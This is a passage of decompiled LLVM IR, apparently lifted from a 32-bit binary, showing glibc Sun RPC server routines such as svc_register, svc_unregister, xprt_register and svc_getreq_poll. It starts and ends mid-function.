  uselistorder label %dec_label_pc_805648a, { 1, 0 }
  uselistorder label %dec_label_pc_80563bb, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp8 = ptrtoint i32* %arg1 to i32
  %v0_8056518 = load i32, i32* @esi, align 4
  %v0_8056519 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v2_805651f = call i32 @_rpc_dtablesize(i32 %v0_8056519, i32 %v0_8056518)
  store i32 %tmp8, i32* @edi, align 4
  %v0_8056566.pre = load i32, i32* @ebp, align 4
  %v5_805656a25 = icmp slt i32 %v0_8056566.pre, %v2_805651f
  br i1 %v5_805656a25, label %dec_label_pc_805652e.lr.ph, label %entry.dec_label_pc_805656c_crit_edge

entry.dec_label_pc_805656c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805656c

dec_label_pc_805652e.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805652e

dec_label_pc_805652e:                             ; preds = %dec_label_pc_805652e.lr.ph, %dec_label_pc_8056560
  %v0_805652e26 = phi i32 [ %tmp8, %dec_label_pc_805652e.lr.ph ], [ %v1_8056560, %dec_label_pc_8056560 ]
  %v1_805652e = inttoptr i32 %v0_805652e26 to i32*
  %v2_805652e = load i32, i32* %v1_805652e, align 4
  br label %dec_label_pc_805654e

dec_label_pc_8056532:                             ; preds = %dec_label_pc_805654e
  %v0_8056535 = load i32, i32* @ebp, align 4
  %v2_8056535 = add i32 %v2_8056552, -1
  %v3_8056535 = add i32 %v2_8056535, %v0_8056535
  %v1_805653a = call i32 @svc_getreq_common(i32 %v3_8056535)
  %v0_805653f = load i32, i32* @ebx, align 4
  %v1_805653f = add i32 %v0_805653f, -1
  %v2_8056547 = urem i32 %v1_805653f, 32
  %v4_8056547 = icmp eq i32 %v2_8056547, 0
  br i1 %v4_8056547, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_8056532
  %v5_8056547 = shl i32 1, %v2_8056547
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_8056532, %bb
  %v1_8056549 = phi i32 [ 1, %dec_label_pc_8056532 ], [ %v5_8056547, %bb ]
  %v0_8056549 = load i32, i32* @esi, align 4
  %v2_8056549 = xor i32 %v0_8056549, %v1_8056549
  br label %dec_label_pc_805654e

dec_label_pc_805654e:                             ; preds = %dec_label_pc_805652e, %bb17
  %storemerge = phi i32 [ %v2_805652e, %dec_label_pc_805652e ], [ %v2_8056549, %bb17 ]
  %v0_8056551 = phi i32 [ %v2_805652e, %dec_label_pc_805652e ], [ %v2_8056549, %bb17 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_8056552 = trunc i32 %v0_8056551 to i16
  %v2_8056552 = call i32 @ffs(i16 %v1_8056552)
  store i32 %v2_8056552, i32* @ebx, align 4
  %v1_805655c = icmp eq i32 %v2_8056552, 0
  %v1_805655e = icmp eq i1 %v1_805655c, false
  br i1 %v1_805655e, label %dec_label_pc_8056532, label %dec_label_pc_8056560

dec_label_pc_8056560:                             ; preds = %dec_label_pc_805654e
  %v0_8056560 = load i32, i32* @edi, align 4
  %v1_8056560 = add i32 %v0_8056560, 4
  store i32 %v1_8056560, i32* @edi, align 4
  %v0_8056563 = load i32, i32* @ebp, align 4
  %v1_8056563 = add i32 %v0_8056563, 32
  store i32 %v1_8056563, i32* @ebp, align 4
  %v5_805656a = icmp slt i32 %v1_8056563, %v2_805651f
  br i1 %v5_805656a, label %dec_label_pc_805652e, label %dec_label_pc_805656c

dec_label_pc_805656c:                             ; preds = %dec_label_pc_8056560, %entry.dec_label_pc_805656c_crit_edge
  %v0_8056573.lcssa = phi i32 [ %v2_805651f, %entry.dec_label_pc_805656c_crit_edge ], [ %v2_8056552, %dec_label_pc_8056560 ]
  ret i32 %v0_8056573.lcssa

; uselistorder directives
  uselistorder i32 %v1_8056560, { 1, 0 }
  uselistorder i32 %v2_8056552, { 0, 3, 2, 1 }
  uselistorder i32 %v2_8056549, { 1, 0 }
  uselistorder i32 %v2_8056547, { 1, 0 }
  uselistorder i32 %v2_805652e, { 1, 0 }
  uselistorder i32 %v2_805651f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805654e, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_805652e, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %v2_8056582 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8056582, i32* @edx, align 4
  %tmp8 = bitcast i32* %stack_var_-132 to i8*
  store i32 %v2_8056582, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805658d = call i8* @_memset(i8* %tmp8, i32 0, i32 32)
  store i32 %arg1, i32* %stack_var_-132, align 4
  %v2_80565a2 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132)
  ret i32 %v2_80565a2

; uselistorder directives
  uselistorder i32* %stack_var_-132, { 0, 2, 1, 3 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80565af = load i32, i32* @ebp, align 4
  %v0_80565b0 = load i32, i32* @edi, align 4
  %v0_80565b1 = load i32, i32* @esi, align 4
  %v0_80565b2 = load i32, i32* @ebx, align 4
  store i32 %v0_80565b2, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_80565be = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80565be, i32* @ecx, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_80565c6 = call i32 @svc_find(i32 %v0_80565b2, i32 %v0_80565b1, i32 %v0_80565b0)
  store i32 %v3_80565c6, i32* @ebx, align 4
  %v1_80565cd = icmp eq i32 %v3_80565c6, 0
  br i1 %v1_80565cd, label %entry.dec_label_pc_8056605_crit_edge, label %dec_label_pc_80565d1

entry.dec_label_pc_8056605_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8056605

dec_label_pc_80565d1:                             ; preds = %entry
  %v3_80565d1 = load i32, i32* %stack_var_-20, align 4
  %v1_80565d5 = inttoptr i32 %v3_80565c6 to i32*
  %v2_80565d5 = load i32, i32* %v1_80565d5, align 4
  store i32 %v2_80565d5, i32* @esi, align 4
  %v1_80565d7 = icmp eq i32 %v3_80565d1, 0
  %v1_80565d9 = icmp eq i1 %v1_80565d7, false
  br i1 %v1_80565d9, label %dec_label_pc_80565e8, label %dec_label_pc_80565db

dec_label_pc_80565db:                             ; preds = %dec_label_pc_80565d1
  %v0_80565db = load i32, i32* %stack_var_-16, align 4
  %v1_80565db = call i32 @__rpc_thread_variables(i32 %v0_80565db)
  %v0_80565e0 = load i32, i32* @esi, align 4
  %v2_80565e0 = add i32 %v1_80565db, 184
  %v3_80565e0 = inttoptr i32 %v2_80565e0 to i32*
  store i32 %v0_80565e0, i32* %v3_80565e0, align 4
  br label %dec_label_pc_80565ea

dec_label_pc_80565e8:                             ; preds = %dec_label_pc_80565d1
  %v2_80565e8 = inttoptr i32 %v3_80565d1 to i32*
  store i32 %v2_80565d5, i32* %v2_80565e8, align 4
  br label %dec_label_pc_80565ea

dec_label_pc_80565ea:                             ; preds = %dec_label_pc_80565db, %dec_label_pc_80565e8
  %v0_80565ed = load i32, i32* @ebx, align 4
  %v1_80565ed = inttoptr i32 %v0_80565ed to i32*
  store i32 0, i32* %v1_80565ed, align 4
  %v0_80565f3 = load i32, i32* @ebx, align 4
  %v1_80565f4 = call i32 @free(i32 %v0_80565f3)
  %v0_80565fb = load i32, i32* @edi, align 4
  %v1_80565fd = call i32 @__GI_pmap_unset(i32 %v0_80565fb)
  br label %dec_label_pc_8056605

dec_label_pc_8056605:                             ; preds = %entry.dec_label_pc_8056605_crit_edge, %dec_label_pc_80565ea
  %v0_805660c = phi i32 [ 0, %entry.dec_label_pc_8056605_crit_edge ], [ %v1_80565fd, %dec_label_pc_80565ea ]
  %v2_8056608 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056608, i32* @ebx, align 4
  store i32 %v0_80565b1, i32* @esi, align 4
  store i32 %v0_80565b0, i32* @edi, align 4
  store i32 %v0_80565af, i32* @ebp, align 4
  ret i32 %v0_805660c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056605, { 1, 0 }
  uselistorder label %dec_label_pc_80565ea, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_8056622

dec_label_pc_8056612:                             ; preds = %dec_label_pc_8056622
  %v0_8056612 = load i32, i32* @ecx, align 4
  %v1_8056614 = add i32 %v3_8056627, 8
  %v2_8056614 = inttoptr i32 %v1_8056614 to i32*
  %v3_8056614 = load i32, i32* %v2_8056614, align 4
  %v1_8056617 = add i32 %v3_8056627, 4
  %v2_8056617 = inttoptr i32 %v1_8056617 to i32*
  %v3_8056617 = load i32, i32* %v2_8056617, align 4
  %v4_805661a = call i32 @svc_unregister(i32 %v3_8056617, i32 %v3_8056614, i32 %v0_8056612, i32 %v0_8056612)
  br label %dec_label_pc_8056622

dec_label_pc_8056622:                             ; preds = %entry, %dec_label_pc_8056612
  %v0_8056622 = phi i32 [ %v3_8056617, %dec_label_pc_8056612 ], [ %tmp7, %entry ]
  %v1_8056622 = call i32 @__rpc_thread_variables(i32 %v0_8056622)
  %v1_8056627 = add i32 %v1_8056622, 184
  %v2_8056627 = inttoptr i32 %v1_8056627 to i32*
  %v3_8056627 = load i32, i32* %v2_8056627, align 4
  %v1_805662d = icmp eq i32 %v3_8056627, 0
  %v1_805662f = icmp eq i1 %v1_805662d, false
  br i1 %v1_805662f, label %dec_label_pc_8056612, label %dec_label_pc_8056631

dec_label_pc_8056631:                             ; preds = %dec_label_pc_8056622
  ret i32 %v3_8056627

; uselistorder directives
  uselistorder i32 %v3_8056627, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056622, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8056636 = load i32, i32* @edi, align 4
  %v0_8056637 = load i32, i32* @esi, align 4
  %v0_8056638 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v2_8056644 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056644, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v3_8056650 = call i32 @svc_find(i32 %v0_8056638, i32 %v0_8056637, i32 %v0_8056636)
  store i32 %v3_8056650, i32* %eax.global-to-local, align 4
  %v1_8056655 = icmp eq i32 %v3_8056650, 0
  br i1 %v1_8056655, label %dec_label_pc_8056660, label %dec_label_pc_8056659

dec_label_pc_8056659:                             ; preds = %entry
  %v1_8056659 = add i32 %v3_8056650, 12
  %v2_8056659 = inttoptr i32 %v1_8056659 to i32*
  %v3_8056659 = load i32, i32* %v2_8056659, align 4
  %v4_8056659 = load i32, i32* @ebp, align 4
  %v15_8056659 = icmp eq i32 %v3_8056659, %v4_8056659
  %v1_805665c = icmp eq i1 %v15_8056659, false
  br i1 %v1_805665c, label %dec_label_pc_80566b4, label %dec_label_pc_805668f

dec_label_pc_8056660:                             ; preds = %entry
  store i32 16, i32* %stack_var_-60, align 4
  %v1_8056665 = call i32 @malloc(i32 16)
  store i32 %v1_8056665, i32* %eax.global-to-local, align 4
  store i32 %v1_8056665, i32* @ebx, align 4
  %v1_805666f = icmp eq i32 %v1_8056665, 0
  br i1 %v1_805666f, label %dec_label_pc_80566b4, label %dec_label_pc_8056673

dec_label_pc_8056673:                             ; preds = %dec_label_pc_8056660
  %v0_8056673 = load i32, i32* @edi, align 4
  %v2_8056673 = add i32 %v1_8056665, 4
  %v3_8056673 = inttoptr i32 %v2_8056673 to i32*
  store i32 %v0_8056673, i32* %v3_8056673, align 4
  %v0_8056676 = load i32, i32* @esi, align 4
  %v1_8056676 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056676 = add i32 %v1_8056676, 8
  %v3_8056676 = inttoptr i32 %v2_8056676 to i32*
  store i32 %v0_8056676, i32* %v3_8056676, align 4
  %v0_8056679 = load i32, i32* @ebp, align 4
  %v1_8056679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056679 = add i32 %v1_8056679, 12
  %v3_8056679 = inttoptr i32 %v2_8056679 to i32*
  store i32 %v0_8056679, i32* %v3_8056679, align 4
  %v0_805667c = load i32, i32* %stack_var_-60, align 4
  %v1_805667c = call i32 @__rpc_thread_variables(i32 %v0_805667c)
  store i32 %v1_805667c, i32* %eax.global-to-local, align 4
  %v1_8056681 = add i32 %v1_805667c, 184
  %v2_8056681 = inttoptr i32 %v1_8056681 to i32*
  %v3_8056681 = load i32, i32* %v2_8056681, align 4
  %v1_8056687 = load i32, i32* @ebx, align 4
  %v2_8056687 = inttoptr i32 %v1_8056687 to i32*
  store i32 %v3_8056681, i32* %v2_8056687, align 4
  %v0_8056689 = load i32, i32* @ebx, align 4
  store i32 %v0_8056689, i32* %v2_8056681, align 4
  br label %dec_label_pc_805668f

dec_label_pc_805668f:                             ; preds = %dec_label_pc_8056659, %dec_label_pc_8056673
  store i32 1, i32* %eax.global-to-local, align 4
  %v4_8056694 = icmp eq i32 %arg5, 0
  br i1 %v4_8056694, label %dec_label_pc_80566b6, label %dec_label_pc_805669b

dec_label_pc_805669b:                             ; preds = %dec_label_pc_805668f
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_805669f = add i32 %arg1, 4
  %v2_805669f = inttoptr i32 %v1_805669f to i16*
  %v3_805669f = load i16, i16* %v2_805669f, align 2
  %v4_805669f = zext i16 %v3_805669f to i32
  store i32 %v4_805669f, i32* %eax.global-to-local, align 4
  %v0_80566a8 = load i32, i32* @esi, align 4
  %v0_80566a9 = load i32, i32* @edi, align 4
  store i32 %v0_80566a9, i32* %stack_var_-60, align 4
  %v4_80566aa = call i32 @pmap_set(i32 %v0_80566a9, i32 %v0_80566a8, i32 %arg5, i32 %v4_805669f)
  store i32 %v4_80566aa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566b6

dec_label_pc_80566b4:                             ; preds = %dec_label_pc_8056660, %dec_label_pc_8056659
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566b6

dec_label_pc_80566b6:                             ; preds = %dec_label_pc_805668f, %dec_label_pc_805669b, %dec_label_pc_80566b4
  %v0_80566bd = phi i32 [ 1, %dec_label_pc_805668f ], [ %v4_80566aa, %dec_label_pc_805669b ], [ 0, %dec_label_pc_80566b4 ]
  ret i32 %v0_80566bd

; uselistorder directives
  uselistorder i32 %v1_8056665, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @svc_find, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80566b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805668f, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_80566be = load i32, i32* @esi, align 4
  %v0_80566bf = load i32, i32* @ebx, align 4
  store i32 %v0_80566bf, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_80566c7 = load i32, i32* %arg1, align 4
  store i32 %v2_80566c7, i32* @ebx, align 4
  %v2_80566c9 = call i32 @_rpc_dtablesize(i32 %v0_80566bf, i32 %v0_80566be)
  %v0_80566ce = load i32, i32* @ebx, align 4
  %v5_80566d0 = icmp slt i32 %v0_80566ce, %v2_80566c9
  br i1 %v5_80566d0, label %dec_label_pc_80566d2, label %dec_label_pc_8056731

dec_label_pc_80566d2:                             ; preds = %entry
  %v0_80566d2 = load i32, i32* %stack_var_-8, align 4
  %v1_80566d2 = call i32 @__rpc_thread_variables(i32 %v0_80566d2)
  %v0_80566d7 = load i32, i32* @ebx, align 4
  %v1_80566d7 = mul i32 %v0_80566d7, 4
  %v1_80566de = add i32 %v1_80566d2, 180
  %v2_80566de = inttoptr i32 %v1_80566de to i32*
  %v3_80566de = load i32, i32* %v2_80566de, align 4
  %v2_80566e4 = add i32 %v3_80566de, %v1_80566d7
  %v3_80566e4 = inttoptr i32 %v2_80566e4 to i32*
  %v4_80566e4 = load i32, i32* %v3_80566e4, align 4
  %v5_80566e4 = load i32, i32* @esi, align 4
  %v16_80566e4 = icmp eq i32 %v4_80566e4, %v5_80566e4
  %v1_80566e7 = icmp eq i1 %v16_80566e4, false
  br i1 %v1_80566e7, label %dec_label_pc_8056731, label %dec_label_pc_80566e9

dec_label_pc_80566e9:                             ; preds = %dec_label_pc_80566d2
  store i32 0, i32* %v3_80566e4, align 4
  %v0_80566f0 = load i32, i32* @ebx, align 4
  %v1_80566f0 = add i32 %v0_80566f0, -1023
  %v6_80566f0 = sub i32 1022, %v0_80566f0
  %v7_80566f0 = and i32 %v6_80566f0, %v0_80566f0
  %v8_80566f0 = icmp slt i32 %v7_80566f0, 0
  %v9_80566f0 = icmp eq i32 %v1_80566f0, 0
  %v10_80566f0 = icmp slt i32 %v1_80566f0, 0
  %v3_80566f6 = icmp eq i1 %v10_80566f0, %v8_80566f0
  %v4_80566f6 = icmp eq i1 %v9_80566f0, false
  %v5_80566f6 = and i1 %v4_80566f6, %v3_80566f6
  br i1 %v5_80566f6, label %dec_label_pc_805670b, label %dec_label_pc_80566f8

dec_label_pc_80566f8:                             ; preds = %dec_label_pc_80566e9
  %v0_80566f8 = call i32 @__GI___rpc_thread_svc_fdset()
  %v0_80566fd = load i32, i32* @ebx, align 4
  %v2_80566ff = udiv i32 %v0_80566fd, 32
  store i32 %v2_80566ff, i32* @ecx, align 4
  %v1_8056704 = urem i32 %v0_80566fd, 32
  %v2_8056707 = mul nuw nsw i32 %v2_80566ff, 4
  %v3_8056707 = add i32 %v2_8056707, %v0_80566f8
  %v4_8056707 = inttoptr i32 %v3_8056707 to i32*
  %v5_8056707 = load i32, i32* %v4_8056707, align 4
  %v8_8056707 = shl i32 1, %v1_8056704
  %v11_8056707 = sub i32 -1, %v8_8056707
  %v12_8056707 = and i32 %v5_8056707, %v11_8056707
  store i32 %v12_8056707, i32* %v4_8056707, align 4
  br label %dec_label_pc_805670b

dec_label_pc_805670b:                             ; preds = %dec_label_pc_80566e9, %dec_label_pc_80566f8
  br label %dec_label_pc_8056728

dec_label_pc_805670f:                             ; preds = %dec_label_pc_8056728
  %v0_805670f = call i32 @__rpc_thread_svc_pollfd()
  %v0_8056714 = load i32, i32* @esi, align 4
  %v1_8056714 = mul i32 %v0_8056714, 8
  %v2_805671b = inttoptr i32 %v0_805670f to i32*
  %v3_805671b = load i32, i32* %v2_805671b, align 4
  %v4_805671b = add i32 %v3_805671b, %v1_8056714
  %v1_805671d = inttoptr i32 %v4_805671b to i32*
  %v2_805671d = load i32, i32* %v1_805671d, align 4
  %v3_805671d = load i32, i32* @ebx, align 4
  %v14_805671d = icmp eq i32 %v2_805671d, %v3_805671d
  %v1_805671f = icmp eq i1 %v14_805671d, false
  br i1 %v1_805671f, label %dec_label_pc_8056727, label %dec_label_pc_8056721

dec_label_pc_8056721:                             ; preds = %dec_label_pc_805670f
  store i32 -1, i32* %v1_805671d, align 4
  %v0_8056727.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056727

dec_label_pc_8056727:                             ; preds = %dec_label_pc_805670f, %dec_label_pc_8056721
  %v0_8056727 = phi i32 [ %v0_8056714, %dec_label_pc_805670f ], [ %v0_8056727.pre, %dec_label_pc_8056721 ]
  %v1_8056727 = add i32 %v0_8056727, 1
  br label %dec_label_pc_8056728

dec_label_pc_8056728:                             ; preds = %dec_label_pc_805670b, %dec_label_pc_8056727
  %storemerge = phi i32 [ 0, %dec_label_pc_805670b ], [ %v1_8056727, %dec_label_pc_8056727 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8056728 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_805672d = load i32, i32* @esi, align 4
  %v2_805672d = inttoptr i32 %v0_8056728 to i32*
  %v3_805672d = load i32, i32* %v2_805672d, align 4
  %v5_805672f = icmp slt i32 %v0_805672d, %v3_805672d
  br i1 %v5_805672f, label %dec_label_pc_805670f, label %dec_label_pc_8056731

dec_label_pc_8056731:                             ; preds = %dec_label_pc_8056728, %entry, %dec_label_pc_80566d2
  %v0_8056734 = phi i32 [ %v2_80566c9, %entry ], [ %v3_80566de, %dec_label_pc_80566d2 ], [ %v0_8056728, %dec_label_pc_8056728 ]
  %v2_8056732 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056732, i32* @ebx, align 4
  store i32 %v0_80566be, i32* @esi, align 4
  ret i32 %v0_8056734

; uselistorder directives
  uselistorder i32 %v2_80566ff, { 1, 0 }
  uselistorder i32 %v0_80566fd, { 1, 0 }
  uselistorder i32 %v1_80566f0, { 1, 0 }
  uselistorder i32 %v3_80566de, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056731, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056728, { 1, 0 }
  uselistorder label %dec_label_pc_8056727, { 1, 0 }
  uselistorder label %dec_label_pc_805670b, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8056738 = load i32, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_805678711 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_805678c12 = load i32, i32* @esi, align 4
  %v2_805678c13 = inttoptr i32 %v0_805678711 to i32*
  %v3_805678c14 = load i32, i32* %v2_805678c13, align 4
  %v5_805678e22 = icmp slt i32 %v0_805678c12, %v3_805678c14
  br i1 %v5_805678e22, label %dec_label_pc_8056790, label %dec_label_pc_8056794

dec_label_pc_8056746:                             ; preds = %dec_label_pc_8056790
  %v2_805674a = mul i32 %v0_805678c24, 8
  %v3_805674a = add i32 %v2_805674a, %arg1
  %v1_805674d = inttoptr i32 %v3_805674a to i32*
  %v2_805674d = load i32, i32* %v1_805674d, align 4
  store i32 %v2_805674d, i32* @ebx, align 4
  %v10_805674f = icmp eq i32 %v2_805674d, -1
  br i1 %v10_805674f, label %dec_label_pc_8056786, label %dec_label_pc_8056754

dec_label_pc_8056754:                             ; preds = %dec_label_pc_8056746
  %v1_8056754 = add i32 %v3_805674a, 6
  %v2_8056754 = inttoptr i32 %v1_8056754 to i16*
  %v3_8056754 = load i16, i16* %v2_8056754, align 2
  %v4_8056758 = icmp eq i16 %v3_8056754, 0
  br i1 %v4_8056758, label %dec_label_pc_8056786, label %dec_label_pc_805675d

dec_label_pc_805675d:                             ; preds = %dec_label_pc_8056754
  %v1_805675d = add i32 %v0_8056790, 1
  store i32 %v1_805675d, i32* @edi, align 4
  %v2_805675e = and i16 %v3_8056754, 32
  %v3_805675e = icmp eq i16 %v2_805675e, 0
  br i1 %v3_805675e, label %dec_label_pc_805677a, label %dec_label_pc_8056762

dec_label_pc_8056762:                             ; preds = %dec_label_pc_805675d
  %v1_8056762 = call i32 @__rpc_thread_variables(i32 %v0_8056738)
  %v1_805676a = add i32 %v1_8056762, 180
  %v2_805676a = inttoptr i32 %v1_805676a to i32*
  %v3_805676a = load i32, i32* %v2_805676a, align 4
  %v1_8056770 = load i32, i32* @ebx, align 4
  %v2_8056770 = mul i32 %v1_8056770, 4
  %v3_8056770 = add i32 %v2_8056770, %v3_805676a
  %v4_8056770 = inttoptr i32 %v3_8056770 to i32*
  %v5_8056770 = load i32, i32* %v4_8056770, align 4
  %v1_8056773 = inttoptr i32 %v5_8056770 to i32*
  %v2_8056773 = call i32 @xprt_unregister(i32* %v1_8056773)
  br label %dec_label_pc_8056783

dec_label_pc_805677a:                             ; preds = %dec_label_pc_805675d
  %v1_805677e = call i32 @svc_getreq_common(i32 %v2_805674d)
  br label %dec_label_pc_8056783

dec_label_pc_8056783:                             ; preds = %dec_label_pc_8056762, %dec_label_pc_805677a
  %v0_8056786.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056786

dec_label_pc_8056786:                             ; preds = %dec_label_pc_8056754, %dec_label_pc_8056746, %dec_label_pc_8056783
  %v0_8056786 = phi i32 [ %v0_805678c24, %dec_label_pc_8056754 ], [ %v0_805678c24, %dec_label_pc_8056746 ], [ %v0_8056786.pre, %dec_label_pc_8056783 ]
  %v1_8056786 = add i32 %v0_8056786, 1
  store i32 %v1_8056786, i32* @esi, align 4
  %v0_8056787 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_805678c = load i32, i32* @esi, align 4
  %v2_805678c = inttoptr i32 %v0_8056787 to i32*
  %v3_805678c = load i32, i32* %v2_805678c, align 4
  %v5_805678e = icmp slt i32 %v0_805678c, %v3_805678c
  br i1 %v5_805678e, label %dec_label_pc_8056790, label %dec_label_pc_8056794

dec_label_pc_8056790:                             ; preds = %entry, %dec_label_pc_8056786
  %v0_805678c24 = phi i32 [ %v0_805678c, %dec_label_pc_8056786 ], [ %v0_805678c12, %entry ]
  %v0_805678723 = phi i32 [ %v0_8056787, %dec_label_pc_8056786 ], [ %v0_805678711, %entry ]
  %v0_8056790 = load i32, i32* @edi, align 4
  %v1_8056790 = load i32, i32* @ebp, align 4
  %v5_8056792 = icmp slt i32 %v0_8056790, %v1_8056790
  br i1 %v5_8056792, label %dec_label_pc_8056746, label %dec_label_pc_8056794

dec_label_pc_8056794:                             ; preds = %dec_label_pc_8056790, %dec_label_pc_8056786, %entry
  %v0_8056787.lcssa = phi i32 [ %v0_805678711, %entry ], [ %v0_8056787, %dec_label_pc_8056786 ], [ %v0_805678723, %dec_label_pc_8056790 ]
  ret i32 %v0_8056787.lcssa

; uselistorder directives
  uselistorder i32 %v0_8056790, { 1, 0 }
  uselistorder i32 %v2_805674d, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_8056790, { 1, 0 }
  uselistorder label %dec_label_pc_8056786, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056783, { 1, 0 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-24 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-24, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805679d = load i32, i32* @esi, align 4
  %v0_805679e = load i32, i32* @ebx, align 4
  store i32 %v0_805679e, i32* %stack_var_-12, align 4
  %v1_805679f = call i32 @__rpc_thread_variables(i32 %v0_805679e)
  store i32 %v1_805679f, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_805679f, i32* @ebx, align 4
  %v1_80567aa = add i32 %v1_805679f, 180
  %v2_80567aa = inttoptr i32 %v1_80567aa to i32*
  %v3_80567aa = load i32, i32* %v2_80567aa, align 4
  %v4_80567aa = icmp eq i32 %v3_80567aa, 0
  %v2_80567b1 = load i32, i32* %arg1, align 4
  store i32 %v2_80567b1, i32* @edi, align 4
  %v1_80567b3 = icmp eq i1 %v4_80567aa, false
  br i1 %v1_80567b3, label %dec_label_pc_80567d7, label %dec_label_pc_80567b5

dec_label_pc_80567b5:                             ; preds = %entry
  %v0_80567b5 = load i32, i32* %stack_var_-12, align 4
  %v2_80567b5 = call i32 @_rpc_dtablesize(i32 %v0_80567b5, i32 %v0_805679d)
  %v2_80567bd = mul i32 %v2_80567b5, 4
  store i32 %v2_80567bd, i32* %eax.global-to-local, align 4
  store i32 %v2_80567bd, i32* %stack_var_-28, align 4
  %v1_80567c1 = call i32 @malloc(i32 %v2_80567bd)
  store i32 %v1_80567c1, i32* %eax.global-to-local, align 4
  %v1_80567c9 = load i32, i32* @ebx, align 4
  %v2_80567c9 = add i32 %v1_80567c9, 180
  %v3_80567c9 = inttoptr i32 %v2_80567c9 to i32*
  store i32 %v1_80567c1, i32* %v3_80567c9, align 4
  %v0_80567cf = load i32, i32* %eax.global-to-local, align 4
  %v1_80567cf = icmp eq i32 %v0_80567cf, 0
  br i1 %v1_80567cf, label %dec_label_pc_8056871, label %dec_label_pc_80567b5.dec_label_pc_80567d7_crit_edge

dec_label_pc_80567b5.dec_label_pc_80567d7_crit_edge: ; preds = %dec_label_pc_80567b5
  %v0_80567d7.pre = load i32, i32* %stack_var_-28, align 4
  %v1_80567d7.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_80567d7

dec_label_pc_80567d7:                             ; preds = %dec_label_pc_80567b5.dec_label_pc_80567d7_crit_edge, %entry
